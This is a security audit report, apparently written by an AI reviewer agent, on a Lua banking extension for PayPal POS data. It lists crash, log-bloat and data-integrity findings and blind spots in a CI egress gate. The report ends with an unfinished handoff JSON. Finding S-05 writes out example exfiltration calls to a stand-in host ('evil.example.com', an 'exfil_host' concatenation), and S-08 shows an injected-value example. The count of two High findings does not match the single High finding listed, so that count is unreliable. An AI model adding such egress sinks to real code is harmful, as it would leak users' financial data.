---
phase: 04-enrichment-refunds-fees-payouts
status: findings_present
critical: 0
high: 2
medium: 4
low: 3
info: 2
reviewer: loop-security-engineer (adversarial pass, 2 rounds; dry on round 2)
review_date: 2026-06-21
branch: phase-4/enrichment
base_commit: a201f6c
test_suite: 328 tests — 0 failures, 0 errors at review time
---

# Phase 4 Security Review — Enrichment (Refunds, Fees, Payouts, Balance, VAT, Tips)

**Scope:** all source/test/CI changes on `phase-4/enrichment` since `a201f6c` (the Phase-3 merge into `main`). Adversarial scope is the 10-item briefing supplied by the orchestrator plus an OWASP-style sweep over the Finance API surface, fee-aggregation contract, refund/payout cross-refresh logic, transactionCode prefix gate, META-03 invariant, and CI egress allowlist.

---

## Severity Histogram

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 2 |
| Medium   | 4 |
| Low      | 3 |
| Info     | 2 |

## Class Histogram

| Class | Count |
|-------|-------|
| Input Validation | 4 |
| Information Disclosure | 2 |
| Data Integrity   | 3 |
| Logic / DoS      | 1 |
| Supply-Chain / CI Gate | 1 |

---

## Per-Threat Verdict Table

| Threat (from adversarial scope) | Verdict | Evidence |
|---------------------------------|---------|----------|
| Scope-1: Bearer redaction across new Finance API surfaces | MITIGATED | `src/http.lua:125` logs only URL on GET; `src/finance.lua:130, 164` keep Bearer inside header table; `spec/refresh_log_redaction_spec.lua:336-394` walks LocalStorage + print stream after every Finance fixture pair (5 cases). No JWT-shape or `Bearer eyJ` substring survives. |
| Scope-2: transactionCode injection via originatingTransactionUuid | PARTIAL | `src/finance.lua:36-37` rejects nil/empty UUIDs but does NOT pattern-validate UUID structure. Adversarial UUID with newlines/control chars passes through into `zettle:fee:<uuid>` / `zettle:payout:<uuid>` strings. See S-08. |
| Scope-3: Fee-aggregate date-string collapse on malformed timestamp | PARTIAL | `src/finance.lua:46-49` returns nil when timestamp parse fails (record dropped — fee lost but not aggregated under wrong date). However `_berlin_date_to_posix` accepts only 4-digit-year date strings, so a fee with year `>=10000` (yielding `"10000-01-01"`) is silently dropped from the aggregate. See S-10. |
| Scope-4: Fee-amount overflow / negative-cap | OPEN | `src/mapping.lua:503-507` sums fee amounts with no upper bound and no rejection of pathological values. A Zettle response (or man-in-the-middle scenario where TLS terminates at a compromised endpoint) containing fee `amount = 2^53` would produce a numerically-garbage aggregate row. See S-09. |
| Scope-5: Refund lookup integrity on duplicate purchaseUUID1 | PARTIAL | `src/entry.lua:190-195` silently overwrites the `purchases_by_uuid` slot on duplicate keys. `payments_by_uuid` (lines 204-215) does the same. See S-06. |
| Scope-6: Phase-3 surface preservation | MITIGATED | Diff `a201f6c..HEAD -- src/entry.lua` lines 1-132 and 373-377 are byte-identical to the Phase-3 baseline. `spec/phase3_surface_preservation_spec.lua:171-214` enforces source-tree byte-identity via plain-text find. |
| Scope-7: CI egress allowlist coverage | PARTIAL | `.github/workflows/ci.yml:83-94` greps `dist/paypal-pos.lua` for any `https?://` URL whose host is not in the allowlist. Gap: scheme-less hosts (`Connection():get("evil.example.com")`) and string-concatenated URLs (`"https://" .. host`) are both invisible to this grep. See S-05. |
| Scope-8: READ:FINANCE scope upgrade UX | PARTIAL | `docs/adr/0004-finance-api-scope-and-fee-fallback.md:77-87` accepts a generic `LoginFailed` on missing scope without a German hint identifying READ:FINANCE as the cause. Documented as a deliberate Phase-5 deferral; reasonable for v0.2.0. See I-02. |
| Scope-9: META-03 invariant strictness on fixtures | PARTIAL | `spec/meta_no_tax_classification_spec.lua:76-88` walks `src/*.lua` and `dist/paypal-pos.lua` only. `spec/fixtures/*.json` is not walked. See I-01. |
| Scope-10: ADR-0004 wording vs future Auth-Code-Flow ADR-0005 | MITIGATED | ADR-0004 §"Decision Concern 1" wording cites the scope name (`READ:FINANCE`) and the regeneration path; an Auth-Code-Flow ADR-0005 can describe a different way to acquire that same scope without contradicting ADR-0004's invariant. |
| Phase-3 carryover: SEC-03 Bearer never reaches logs | MITIGATED | Extended gating spec (`refresh_log_redaction_spec.lua:336-394`) drives 5 Finance API response shapes and asserts no `eyJ`/`Bearer eyJ` substring in captured prints or LocalStorage. |
| Phase-3 carryover: D-38 transactionCode prefix gate (now 5 prefixes) | MITIGATED | `refresh_log_redaction_spec.lua:232-322` asserts every emitted code matches exactly one of the 5 prefixes AND every prefix is exercised across union refreshes. |
| New surface: Multi-rate VAT format-string injection | PARTIAL | `src/mapping.lua:233-237` calls `string.format("%d", e.rate)` on attacker-controlled `groupedVatAmounts` key. A key like `"1e308"` is parsed by `tonumber` to a finite float that has no integer representation; `string.format("%d", ...)` raises an uncaught Lua error. See S-01. |
| New surface: card-tail purpose accepts unbounded cardType | PARTIAL | `src/mapping.lua:286-301` concatenates `attrs.cardType` directly into the purpose string with no length cap. See S-04. |
| Phase-3 carryover: S-01 currency-cap fix applied to all log sites | PARTIAL | Mapping log sites updated; Phase-4 `src/finance.lua:181-182, 200-201` introduce TWO new log sites that concatenate `currencyId` without the same `:sub(1, 8)` cap. See S-02. |

---

## Findings

### S-01 — Multi-rate VAT formatter crashes (Lua error) on pathological rate key

**Severity:** High
**Class:** Input Validation / DoS
**Gap:** `src/mapping.lua:230-238` reads `groupedVatAmounts` keys as rate strings, runs `tonumber(k)` (which accepts decimal, hex, scientific notation, and whitespace-padded numerics), then formats the resulting numeric via `string.format("%d", e.rate)` when `e.rate == math.floor(e.rate)`. For any finite float whose integer representation overflows Lua's 64-bit signed range (e.g. parsed from `"1e308"`), `math.floor(x) == x` evaluates true, and `string.format("%d", x)` raises `"bad argument #2 to 'format' (number has no integer representation)"` — an uncaught Lua error that aborts the entire `RefreshAccount` callback. The `%g` branch is also vulnerable for the same input class because `math.floor(1e308) == 1e308` routes through `%d`. Trigger condition is narrow (Zettle would need to emit a non-standard key plus at least one other key to reach the multi-rate branch) but the code path is real and the response data is fully attacker-controllable in any compromised-CDN/MITM scenario.

This is the same class of bug as Phase-3's S-02 (`_parse_iso8601_utc` crashing on month outside `[1..12]`). Phase-3 mitigated by adding range guards before the unsafe arithmetic. Phase 4 must apply the same defensive pattern to the new formatter.

**Mitigation:** Add a range guard after `tonumber(k)` and before pushing into `rate_entries`:

```lua
if rate_num and type(v) == "number"
    and rate_num >= 0 and rate_num <= 100 then
  rate_entries[#rate_entries + 1] = { rate = rate_num, amount = v }
end
```

A VAT rate outside `[0, 100]` is non-sensical for any real-world tax regime, and the cap forecloses the `string.format("%d", huge)` crash path. Optionally also cap the corresponding `amount` value at a sane upper bound (see S-09).

**Where to apply:** `src/mapping.lua:221-224` — extend the existing guard inside the `for k, v in pairs(gva)` loop.

**Proof:** Construct a fixture where `groupedVatAmounts = { ["1e308"] = 100, ["19"] = 200 }`. Call `M_mapping.purchase_to_transaction(p)` with that fixture. Confirm the Lua error `"bad argument #2 to 'format' (number has no integer representation)"` is raised in the `string.format("%d", e.rate)` line. Spec recipe: extend `spec/mapping_spec.lua` with a single GREEN case that asserts the call returns a transaction table (no error) when given the pathological key.

---

### S-02 — Phase-3 S-01 currency-cap fix not applied to Phase-4 Finance balance log sites

**Severity:** Medium
**Class:** Information Disclosure / Input Validation
**Gap:** Phase-3 closed S-01 by capping the attacker-controllable `currency` field to 8 characters before concatenating into log lines (`src/mapping.lua:371, 414`). Phase 4 introduced two **new** log sites that exhibit the same unbounded-concatenation pattern with the analogous `currencyId` field:

```lua
M_log.info("M_finance.fetch_account_state: liquid balance non-EUR, skipping (currencyId="
  .. tostring(liquid.data.currencyId) .. ")")
```

If a Zettle response (or compromised-endpoint scenario) returns `currencyId` of arbitrary length (e.g. 10 000 characters), the log line grows accordingly. `M_log.redact()` passes the value through unchanged because it matches no JWT/Bearer/assertion/access_token pattern. This is the same defence-in-depth gap Phase-3 closed for the mapping log sites; the fix was not propagated.

**Mitigation:** Apply the same `:sub(1, 8)` cap used in `src/mapping.lua:371`:

```lua
local cur = tostring(liquid.data.currencyId or "<nil>"):sub(1, 8)
M_log.info("M_finance.fetch_account_state: liquid balance non-EUR, skipping (currencyId=" .. cur .. ")")
```

**Where to apply:** `src/finance.lua:181-182` (liquid balance log site) and `src/finance.lua:200-201` (preliminary balance log site).

**Proof:** Inject a non-EUR `currencyId = string.rep("X", 1000)` fixture into `fetch_account_state`. Capture the print stream and assert the resulting log line length exceeds the expected ISO-4217 + boilerplate length.

---

### S-03 — `_url_encode_query` skips percent-encoding; Finance API URLs accept literal control chars

**Severity:** Medium
**Class:** Input Validation
**Gap:** `src/finance.lua:85-92` documents that `_url_encode_query` deliberately does NOT percent-encode (because Finance API accepts literal `:` in start/end). However, the function's inputs include `clamped_since` and `os.time() + 60`, both of which flow through `_iso8601_utc_no_z(posix)` — a pure formatter on a numeric `posix`. So in normal flow the values are safe.

The gap is structural: any future caller that passes a string-typed value through this encoder (rather than a number) would inject that string verbatim into the URL query, including control characters, fragment delimiters, or additional `&key=value` segments. The function's only safety property is that today's two callers happen to pass formatted numerics.

**Mitigation:** Either:

(a) Add a defensive assertion at the encoder entry: `assert(type(v) == "string" or type(v) == "number", ...)` plus a regex deny-list rejecting control chars and `&`/`?`/`#` in any string value; OR

(b) Use `MM.urlencode` (already available — used in `src/http.lua:35`) for value-side encoding only, leaving the `:` characters in pre-formatted ISO-8601 values intact via a stricter `_iso8601_utc_no_z`-only typed signature.

Option (a) is the lowest-touch change; option (b) is the structurally correct one.

**Where to apply:** `src/finance.lua:85-92`.

**Proof:** Static analysis — there is no runtime reproducer in the current Phase-4 code path because both callers pass pre-formatted numerics. The gap surfaces the first time a contributor adds a string-typed parameter to the `q` table.

---

### S-04 — Card-brand tail concatenates unbounded `cardType` into `purpose`

**Severity:** Medium
**Class:** Information Disclosure / Input Validation
**Gap:** `src/mapping.lua:286-301` builds the SALE-07 card-tail line by concatenating `attrs.cardType` (after `:upper()` lookup miss) verbatim into the `purpose` string with no length cap. The fallback path `brand_de = card_type:sub(1, 1):upper() .. card_type:sub(2):lower()` preserves the full attacker-controllable string. The same unbounded-concatenation pattern S-01 closed for currency in Phase 3 applies here for `cardType`.

A pathological `cardType` of 100 000 bytes would produce a 100 KB `purpose` field per transaction, ballooning the `RefreshAccount` return table and any downstream serialisation cost.

**Mitigation:** Cap `cardType` and `cardPaymentEntryMode` to a sane display length before any use:

```lua
if type(attrs.cardType) == "string" and #attrs.cardType > 0 then
  card_type = attrs.cardType:sub(1, 32)
end
if type(attrs.cardPaymentEntryMode) == "string" and #attrs.cardPaymentEntryMode > 0 then
  entry_mode = attrs.cardPaymentEntryMode:sub(1, 32)
end
```

32 bytes is generous for any documented Zettle `cardType` value (`VISA`, `MASTERCARD`, `GIROCARD`, etc., all < 12 chars).

**Where to apply:** `src/mapping.lua:276-281`.

**Proof:** Construct a fixture with `payments[1].attributes.cardType = string.rep("X", 100000)` and call `purchase_to_transaction`. Assert the resulting `purpose` length is bounded.

---

### S-05 — CI egress allowlist gate has two structural blind spots

**Severity:** Medium
**Class:** Supply-Chain / CI Gate
**Gap:** `.github/workflows/ci.yml:83-94` enforces the egress allowlist via:

```bash
BAD=$(grep -Eo 'https?://[^"'"'"' ]+' dist/paypal-pos.lua \
  | grep -v 'oauth\.zettle\.com\|purchase\.izettle\.com\|finance\.izettle\.com' \
  || true)
```

Two structural blind spots:

1. **Scheme-less hosts.** A future contributor could add `Connection():get("evil.example.com/path")`. The `https?://` anchor never matches, the gate never sees the host, and the build passes. MoneyMoney's `Connection()` may or may not require a scheme depending on its internal HTTP layer — verifying is out of scope, but the gate should be defensive against both.

2. **String-concatenated URLs.** A future contributor could write `local url = "https://" .. exfil_host .. "/log"`. The gate's grep sees `"https://"` (which has nothing after it to match `[^"' ]+`) and `exfil_host` (no scheme prefix). Neither emits a flaggable substring. The build passes.

**Mitigation:** Strengthen the gate to:

(a) Also grep for bare TLD-shaped tokens — e.g. `grep -Eo '[a-z0-9.-]+\.(com|net|org|io|dev|app|cloud)\b' dist/paypal-pos.lua` and apply the allowlist to that match set as well.

(b) Reject any source line that contains both `Connection` and string concatenation in close proximity: `grep -E 'Connection.*\.\.' src/*.lua`.

Both are imperfect heuristics, but they raise the bar materially over the current single regex. A more durable defence is to wrap `Connection():request` inside `M_http.get_json` and assert (at runtime, in a spec gating CI) that the URL starts with one of the three allowlisted prefixes — moving the gate from build-time grep to runtime assertion. The runtime assertion approach also closes the gap automatically when the build adds new modules.

**Where to apply:** `.github/workflows/ci.yml:83-94` plus a complementary spec at `spec/sec02_egress_runtime_spec.lua` (new file) that monkey-patches `Mocks._capture_request` to assert URL prefix at every call site.

**Proof:** Add a single-line test mutation that introduces `Connection():get("evil.example.com/log")` to `src/finance.lua` in a throwaway branch. Run the CI workflow locally. Confirm the build passes (no allowlist violation reported) despite the unauthorized egress sink. **Do NOT commit this test mutation** — describe the failure mode in the writeup only.

---

### S-06 — Duplicate `purchaseUUID1` / `payments[].uuid` silently overwrite cross-refresh indexes

**Severity:** Medium
**Class:** Data Integrity
**Gap:** `src/entry.lua:190-195` builds `purchases_by_uuid` via plain table assignment. If two purchases on the same page share `purchaseUUID1` (duplicate from Zettle, paginated overlap, or compromised response), the second silently overwrites the first. Subsequent refund lookups via `purchases_by_uuid[p.refundsPurchaseUUID1]` would resolve to the last-written purchase, embedding the wrong `original_receipt` in the refund's `purpose`.

The same overwrite pattern exists at `src/entry.lua:204-215` for `payments_by_uuid` (used by the fee-linkage join) and at `src/entry.lua:257-260` for `fin_payments_by_uuid` (used by the SALE-03 promotion sweep).

Practical impact:
- Refund cites the wrong original receipt number — bookkeeping integrity break.
- Fee gets linked to the wrong sale's receipt in `purpose` text — bookkeeping integrity break.
- Sale gets promoted to `booked=true` with a `valueDate` derived from a different payout — bookkeeping integrity break.

None of these are exploitable in the network-security sense, but all three are user-trust failures that defeat the Phase-4 promise ("the data is accurate, otherwise the project has failed").

**Mitigation:** Wrap each index build with a duplicate-detection check that logs a German WARN and adopts a deterministic last-write or first-write policy. First-write is safer (it preserves the earliest record, which is more likely to be the "real" one in a Zettle backfill scenario):

```lua
if purchases_by_uuid[p.purchaseUUID1] == nil then
  purchases_by_uuid[p.purchaseUUID1] = p
else
  M_log.warn("RefreshAccount: duplicate purchaseUUID1 on same page; first-write wins")
end
```

Apply the same pattern at all three index sites.

**Where to apply:** `src/entry.lua:190-195`, `src/entry.lua:204-215`, `src/entry.lua:257-260`.

**Proof:** Construct a purchase fixture page with two purchases sharing `purchaseUUID1 = "AAAA-AAAA-AAAA"`. Confirm via `print(#vim.tbl_keys(purchases_by_uuid))` (or Lua equivalent) that the index has exactly 1 entry after the build, demonstrating the silent collapse.

---

### S-07 — `payout.timestamp_posix` sort uses ascending order but tied timestamps are nondeterministic

**Severity:** Low
**Class:** Data Integrity
**Gap:** `src/entry.lua:244` sorts payouts by `timestamp_posix` ascending. `table.sort` is not stable — when two payouts share the exact timestamp (possible at second-granularity if Zettle batches), the relative order is implementation-defined. Downstream `_find_covering_payout(payment_posix)` then walks the list and returns the first matching payout, so two consecutive refreshes could promote the same sale to two different `valueDate` values (still both correct in the sense that both payouts covered the payment, but the recorded `valueDate` flips between refreshes).

MoneyMoney's dedup updates the row in place per the documented `transactionCode` contract, so the user sees the `valueDate` change. This is not a security issue but is a Phase-3 D-31 / Phase-4 D-56 promise-violation in an edge case.

**Mitigation:** Make the sort stable by adding a tiebreaker on `originatingTransactionUuid`:

```lua
table.sort(fin_payouts, function(a, b)
  if a.timestamp_posix ~= b.timestamp_posix then
    return a.timestamp_posix < b.timestamp_posix
  end
  return a.originatingTransactionUuid < b.originatingTransactionUuid
end)
```

**Where to apply:** `src/entry.lua:244`.

**Proof:** Construct a fixture with two PAYOUTs at the same `timestamp` and run two consecutive refreshes against the same fixture set. Without the tiebreaker, the `valueDate` assignment is non-deterministic across Lua implementations / versions. With the tiebreaker, the assignment is byte-stable.

---

### S-08 — `originatingTransactionUuid` is not pattern-validated before composing `transactionCode`

**Severity:** Low
**Class:** Input Validation
**Gap:** `src/finance.lua:36-37` rejects nil/empty `originatingTransactionUuid` but does not check its structural shape. A Zettle response (or compromised-endpoint scenario) containing a UUID with newlines, control characters, or trailing whitespace would produce a `transactionCode` like `"zettle:fee:abc\n; DROP"`. The string is consumed by MoneyMoney's dedup contract (byte-comparison), so the technical impact is bounded: the transaction is dedup'd by the same byte sequence and downstream parsers would see the malformed code.

However, the prefix-gate spec at `refresh_log_redaction_spec.lua:240-246` uses `code:find("^zettle:fee:", ...)` which is permissive about everything after the prefix. The gate cannot catch a malformed UUID payload. If a downstream MoneyMoney consumer (CSV export, GoBD audit print) trusts the `transactionCode` field, a control-character injection could shift terminal output, break exports, or in the worst case carry an unintended interpretation in a downstream tool.

**Mitigation:** Add a UUID pattern validation in `parse_transaction`:

```lua
if not uuid:match("^[0-9a-fA-F]+%-[0-9a-fA-F]+%-[0-9a-fA-F]+%-[0-9a-fA-F]+%-[0-9a-fA-F]+$") then
  M_log.info("M_finance.parse_transaction: skipping record with malformed UUID shape")
  return nil
end
```

A strict 8-4-4-4-12 hex pattern (`^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$`) is even better but Lua's pattern grammar does not support `{n}` quantifiers; the multi-group pattern above is the standard workaround.

**Where to apply:** `src/finance.lua:36-37`. Same defence should apply in `M_mapping.fee_to_transaction:463`, `fee_aggregate_to_transaction` (date_iso pattern already there), and `payout_to_transaction:530`.

**Proof:** Construct a Finance API fixture with `originatingTransactionUuid = "abc\ndef"`. Without the guard, `M_finance.parse_transaction` accepts it, and the downstream `M_mapping.fee_to_transaction` emits `transactionCode = "zettle:fee:abc\ndef"`. Assert that the new guard rejects it.

---

### S-09 — Fee aggregate sums arbitrarily many records with no per-record or per-sum cap

**Severity:** Low
**Class:** Input Validation / Data Integrity
**Gap:** `src/mapping.lua:503-507` sums fee amounts into `sum_minor` without bounding each individual fee or capping the running sum. Lua's number type handles `2^53` exactly, but values beyond that lose integer precision. A Zettle response with even a single fee of `amount = 1e18` would corrupt the aggregate amount silently — the user sees a bookkeeping row of "10 quadrillion EUR Tagesaggregat" which is functionally garbage.

A more realistic adversarial scenario: a compromised CDN injects 100 000 small fees into a single date's Finance API response. The aggregate row sums them into a reasonable-looking but bookkeeping-wrong amount. The `MAX_PAGES = 50` guard at `src/pagination.lua:127` caps total records at 50 000, so the worst case is bounded by ~50 000 fees * `amount` — but with no individual `amount` cap.

**Mitigation:** Add a per-record sanity cap and a per-sum sanity cap inside the aggregator:

```lua
local MAX_FEE_MINOR_UNITS = 100000 * 100   -- 100,000 EUR per individual fee
local MAX_AGG_MINOR_UNITS = 1000000 * 100  -- 1,000,000 EUR per aggregate row

for _, f in ipairs(fees_for_date) do
  if type(f) == "table" and type(f.amount) == "number"
      and math.abs(f.amount) <= MAX_FEE_MINOR_UNITS then
    sum_minor = sum_minor + f.amount
  else
    M_log.warn("fee_aggregate_to_transaction: discarding out-of-range fee")
  end
end
if math.abs(sum_minor) > MAX_AGG_MINOR_UNITS then
  M_log.warn("fee_aggregate_to_transaction: aggregate exceeds sanity cap; rejecting row")
  return nil
end
```

The chosen caps should be tunable in a single module-level constant; the values above are illustrative.

**Where to apply:** `src/mapping.lua:496-519`.

**Proof:** Construct a fixture with a single fee `amount = 1e18`. Assert that the aggregate row is rejected (returns nil) with the new guard. Without the guard, the row is emitted with `amount = 1e16` EUR.

---

### S-10 — `_berlin_date_to_posix` regex rejects 5-digit-year dates; fees from year-10000+ silently dropped

**Severity:** Low
**Class:** Input Validation / Data Integrity
**Gap:** `src/mapping.lua:343-347` validates the `date_iso` string with `^%d%d%d%d%-%d%d%-%d%d$`, accepting only 4-digit years. However, the upstream `_berlin_local_date` (line 328-333) derives the date string from `os.date("!%Y-%m-%d", berlin_posix)`, which emits 5-digit years for any POSIX timestamp >= `253402300800` (year 10000). A fee with a year-10000 timestamp would yield `date_iso = "10000-01-01"`, fail the regex, and be silently dropped from the aggregate (returns nil → no fee row emitted at all).

Practical exposure is near-zero (Zettle would never legitimately emit such a timestamp), but in an adversarial-response scenario the user would see fees silently disappear. Combined with S-09 this means a malformed Finance API response can produce a bookkeeping picture that is missing fee data entirely.

**Mitigation:** Either:

(a) Loosen the regex to accept 5+ digit years (`^%d+%-%d%d%-%d%d$`), OR

(b) Tighten the upstream `_berlin_local_date` to clamp the date string at 4 digits via a sanity check that the timestamp is within the years 2020-2099 expected range.

Option (b) is safer because it also catches the inverse (negative-year) edge case.

**Where to apply:** `src/mapping.lua:345` (regex tighten) and `src/mapping.lua:328-333` (date clamp).

**Proof:** Construct a fee with timestamp parseable to a year-10000 POSIX (`9999-12-31T23:00:00.000+0000` → Berlin local → `os.date` → `"10000-01-01"`). Confirm the fee is silently dropped from aggregation.

---

### I-01 — META-03 walker scope omits `spec/fixtures/`

**Severity:** Info
**Class:** Process / Test Hygiene
**Gap:** `spec/meta_no_tax_classification_spec.lua:76-88` walks `src/*.lua` and `dist/paypal-pos.lua` only. A future fixture author could add `"USt-frei"` to a JSON fixture and trick a subsequent spec author into asserting against it (e.g., "the purpose contains 'USt-frei'"), which would then leak the forbidden string into a real refresh path through a spec contract.

This is a process gap, not a runtime gap. The Phase 4 fixture set was scanned manually — no forbidden phrases found.

**Mitigation:** Either:

(a) Extend the META-03 walker to `spec/fixtures/**/*.json` as well, OR

(b) Document explicitly in the spec header that fixtures are intentionally out-of-scope and why.

Option (a) is the safer default; the cost is one additional file read pass per CI run.

**Where to apply:** `spec/meta_no_tax_classification_spec.lua:74-99`.

**Proof:** Add a hand-crafted fixture file `spec/fixtures/purchases/purchase_forbidden_string.json` containing `"USt-frei"`. Confirm the current spec passes (no failure). With the walker extended, confirm the spec fails.

---

### I-02 — Missing-scope error UX: generic LoginFailed without German hint

**Severity:** Info
**Class:** UX / Compliance Communication
**Gap:** ADR-0004 §"Decision Concern 1" accepts that a v0.1.0 user who upgrades without re-minting the API key with `READ:FINANCE` will see a generic `LoginFailed` (MoneyMoney's standard "credentials rejected" prompt). The German error string does not name `READ:FINANCE` as the missing scope. A user without the README context will likely conclude their API key was revoked, attempt to re-paste it, fail again, and either contact support or abandon the upgrade.

The ADR documents the deferral to Phase 5 explicitly and the README v0.2.0 §"Inbetriebnahme bei bestehendem v0.1.0 API-Key" covers the diagnosis path. This is acceptable for a community-extension release but is a real friction point for the first day after v0.2.0 ships.

**Mitigation:** Phase 5 can add a scope-specific error string. For Phase 4, the README link in the error message is sufficient. Optionally, the `M_errors.from_http_status` for 401 returned by `finance.izettle.com` could return a distinct German message ("Berechtigung fehlt: API-Key muss READ:FINANCE-Scope haben") — feasible because the call site is identifiable (the only 401-source against `finance.izettle.com` in Phase 4 is missing scope; genuine credential failure surfaces against `oauth.zettle.com`).

**Where to apply:** Phase 5; ADR-0004 already accepts deferral.

**Proof:** Queue a 401 response from `finance.izettle.com` with body `{"error": "insufficient_scope"}`. Confirm the returned RefreshAccount error string is `LoginFailed` (the MoneyMoney built-in) rather than a scope-naming German string.

---

## SEC-03 Compliance Verdict

**COMPLIANT.** All three Phase-3 SEC-03 gates remain satisfied and have been extended to cover Phase-4 Finance API surfaces:

- **Gate A (LocalStorage walk):** Extended in `spec/refresh_log_redaction_spec.lua:336-394` to drive 5 Finance API response shapes through `RefreshAccount` and assert no JWT-shape value survives in LocalStorage. Passing.
- **Gate B (captured print stream):** Extended to assert no `eyJ[A-Za-z0-9_-]+` or literal `Bearer eyJ` substring appears in any captured print line after each of the 5 Finance fixture pairs. Passing. Phase-4-specific verification: `M_finance.fetch`, `fetch_account_state`, `fetch_all` all route through `M_http.get_json` (which logs only the URL, never the headers).
- **Gate C (transactionCode prefix):** Extended from 2 to 5 prefixes at `refresh_log_redaction_spec.lua:232-322`. Asserts every emitted code matches exactly one of the 5 Phase-4 prefixes AND every prefix is exercised across union refreshes. Passing.

Defence-in-depth gaps to note (defensively framed):
- **S-02** (currency-cap not propagated to Finance log sites) does not violate SEC-03 because `currencyId` is not a credential-class field covered by the redactor's patterns. Recommend fixing for log-bloat hygiene.
- **S-08** (UUID not pattern-validated) does not affect SEC-03 because UUIDs are not credentials, but it weakens the structural strength of the prefix-gate contract (gate accepts arbitrary bytes after the prefix).

---

## Phase-3 Carryover Verdict (re-verified)

| Carryover | Verdict | Phase-4 evidence |
|-----------|---------|------------------|
| S-01 (Phase-3): currency-cap in log lines | PARTIAL | Mapping sites mitigated. Phase-4 introduces new finance.lua sites with the same gap — see S-02 above. |
| S-02 (Phase-3): ISO-8601 parser month range | MITIGATED | `src/mapping.lua:90-91` guards `M < 1 or M > 12` and `D < 1 or D > 31`. Confirmed in current diff. |
| S-03 (Phase-3): transactionCode collision on nil UUID | MITIGATED | `src/mapping.lua:378-381, 419-422` guards present. Phase-4 mappers `fee_to_transaction:464` and `payout_to_transaction:531` apply the same pattern. |
| S-04 (Phase-3): since=math.huge / future since | MITIGATED | `src/entry.lua:155` `math.min(effective_since, os.time())` confirmed. |
| S-05 (Phase-3): DST table ending at 2040 | MITIGATED | Table extended to 2050 at `src/mapping.lua:27-59`. |
| S-06 (Phase-3): MAX_PAGES placeholder text | PARTIAL — UNCHANGED | Now affects both iterators (`src/pagination.lua:48, 129`). Carries forward; recommend Phase-4 follow-up to add `error.too_many_pages` i18n key. |

---

## Phase-4 Surface Preservation Verdict (Scope-6 deep dive)

Confirmed byte-identical Phase-3 baseline for:

- `SupportsBank` — `src/entry.lua:10-12` matches Phase-3 baseline byte-for-byte (`git show a201f6c:src/entry.lua` lines 10-12).
- `InitializeSession2` — `src/entry.lua:14-94` matches Phase-3 baseline byte-for-byte.
- `ListAccounts` — `src/entry.lua:96-132` matches Phase-3 baseline byte-for-byte.
- `EndSession` — `src/entry.lua:373-377` matches Phase-3 baseline byte-for-byte (only adds `M_http.shutdown()` which was already present in Phase 3).

`RefreshAccount` (`src/entry.lua:139-371`) has expanded as documented in 04-CONTEXT.md (steps 5-16 added, return shape extended with `pendingBalance`). The `spec/phase3_surface_preservation_spec.lua:171-214` source-tree audit gates the four frozen callbacks via plain-text substring matching; Phase 4 callback expansion is explicitly the intended diff.

---

## OWASP-Style Sweep Highlights (defensive framing)

| OWASP class | Phase-4 verdict |
|---|---|
| A01 (Broken Access Control) | N/A — read-only extension; no write operations against PayPal POS. |
| A02 (Cryptographic Failures) | MITIGATED — TLS terminates inside MoneyMoney's `Connection()`; no bespoke crypto added. Bearer token stays in module-local header tables (S-02 partial gap on log-line currency, not credential). |
| A03 (Injection) | PARTIAL — S-01 (rate-key format crash), S-03 (URL query encoder), S-04 (cardType length), S-08 (UUID pattern) all in this class. None reach SQL or shell sinks; all are Lua-error/log-bloat/data-integrity class. |
| A04 (Insecure Design) | MITIGATED — D-49 fee-aggregate dedup tradeoff explicitly documented in ADR-0004 with Yves sign-off; D-56 SALE-03 promotion rule conservative-miss-only. |
| A05 (Security Misconfiguration) | PARTIAL — S-05 CI egress allowlist gate has two structural blind spots. |
| A06 (Vulnerable Components) | N/A — no shipped dependencies; tooling deps (busted/luacheck/luacov) gated by Dependabot. |
| A07 (Identification/Auth Failures) | MITIGATED — Phase-2 carryover; no auth changes in Phase 4 except scope-name documentation in ADR-0004. |
| A08 (Software/Data Integrity Failures) | PARTIAL — S-06 (duplicate index overwrite), S-07 (unstable sort), S-09 (unbounded fee aggregate). |
| A09 (Logging/Monitoring) | MITIGATED — SEC-03 gating spec extended to cover all Phase-4 surfaces. S-02 is a log-bloat gap, not a logging-as-defence gap. |
| A10 (SSRF) | MITIGATED — `Connection()` only ever receives the three allowlisted URLs as string literals in current code. S-05 is the structural risk if a future contributor breaks this discipline. |

---

<orchestrator_handoff>
{
  "verdict": "FINDINGS",
  "pass_summary": "Pass 2 — dry (no new findings in round 2). 2 adversarial rounds total.",
  "critical_findings_count": 0,
  "high_findings_count": 2,
  "medium_findings_count": 4,
  "low_findings_count": 3,
  "info_findings_count": 2,
  "sec03_compliant": true,
  "phase3_surface_preserved": true,
  "findings": {
    "S-01": {
      "severity": "High",
      "class": "Input Validation / DoS",
      "summary": "Multi-rate VAT formatter crashes (Lua error) on pathological groupedVatAmounts key — same class as Phase-3 S-02",
      "file": "src/mapping.lua:230-238",
      "pr_type": "Held-for-review PR",
      "fix": "Range-guard tonumber(k) result to [0, 100] before pushing into rate_entries"
    },
    "S-02": {
      "severity": "Medium",
      "class": "Information Disclosure / Input Validation",
      "summary": "Phase-3 S-01 currency-cap fix not propagated to two new Phase-4 Finance balance log sites",
      "file": "src/finance.lua:181-182, 200-201",
      "pr_type": "Sec-PR batch",
      "fix": "Apply :sub(1, 8) cap on currencyId before log concatenation (same pattern as src/mapping.lua:371)"
    },
    "S-03": {
      "severity": "Medium",
      "class": "Input Validation",
      "summary": "_url_encode_query skips percent-encoding; safe by accident today, structurally fragile for future contributors",
      "file": "src/finance.lua:85-92",
      "pr_type": "Sec-PR batch",
      "fix": "Either assert numeric-only value types OR adopt MM.urlencode for value-side encoding"
    },
    "S-04": {
      "severity": "Medium",
      "class": "Information Disclosure / Input Validation",
      "summary": "Card-brand tail concatenates unbounded cardType / cardPaymentEntryMode into purpose field",
      "file": "src/mapping.lua:276-281",
      "pr_type": "Sec-PR batch",
      "fix": "Cap both fields at 32 bytes before use"
    },
    "S-05": {
      "severity": "Medium",
      "class": "Supply-Chain / CI Gate",
      "summary": "CI egress allowlist gate misses scheme-less hosts and string-concatenated URLs",
      "file": ".github/workflows/ci.yml:83-94",
      "pr_type": "Held-for-review PR",
      "fix": "Add TLD-pattern grep + runtime egress spec asserting URL prefix at every M_http call site"
    },
    "S-06": {
      "severity": "Medium",
      "class": "Data Integrity",
      "summary": "Three cross-refresh indexes silently overwrite on duplicate keys; refunds / fees / promotions can resolve to wrong record",
      "file": "src/entry.lua:190-195, 204-215, 257-260",
